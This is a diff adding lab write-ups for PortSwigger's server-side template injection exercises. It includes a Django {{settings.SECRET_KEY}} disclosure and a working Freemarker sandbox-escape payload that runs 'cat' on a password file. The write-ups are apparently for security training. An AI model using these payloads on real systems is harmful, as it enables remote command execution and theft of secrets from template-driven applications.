@@ -76,3 +76,33 @@ we can craft the following payload: <br>
     ```
 
 4. URL-encoding this payload and submitting it as **message** solves the lab.
+
+## SSTI with information disclosure via user-supplied objects
+[SSTI with information disclosure via user-supplied objects](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)
+
+Write-up:
+
+1. After logging in, we are able to edit templates, and we discover that a Django 
+template with Python 2.7 is being used.
+
+2. Upon researching Django SSTI, we can find this [website](https://www.wallarm.com/what/server-side-template-injection-ssti-vulnerability).
+It shows us that we can try to access {{settings}}, and possibly {{settings.SECRET_KEY}}, which are both possible.
+This reveals the solution: **xd4klewsdwzux56wdrfdxgaajj8ekyr0**
+
+## SSTI in a sandboxed environment
+[SSTI in a sandboxed environment](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment)
+
+Write-up:
+
+1. We are told the website uses a Freemarker template and that we should break out
+of the sandbox and read flag at home/carlos/my_password.txt. After logging in,
+we see that we can once again edit the posts' templates.
+
+2. Attempting to use the payload `${"freemarker.template.utility.Execute"?new()("cat /home/carlos/my_password.txt")}`
+fails due to the sandboxed environment: <br>
+"Instantiating freemarker.template.utility.Execute is not allowed in the template for security reasons."
+
+1. After some research, we can find the following [documented exploit](https://www.synacktiv.com/en/publications/exploiting-cve-2021-25770-a-server-side-template-injection-in-youtrack). We use it
+to craft the following payload: <br>
+`${product.class.protectionDomain.classLoader.loadClass("freemarker.template.ObjectWrapper").getField("DEFAULT_WRAPPER").get(null).newInstance(product.class.protectionDomain.classLoader.loadClass("freemarker.template.utility.Execute"),null)("cat /home/carlos/my_password.txt")}` <br>
+This gets us the solution: **6ahblydrrpsffr1ru83r**
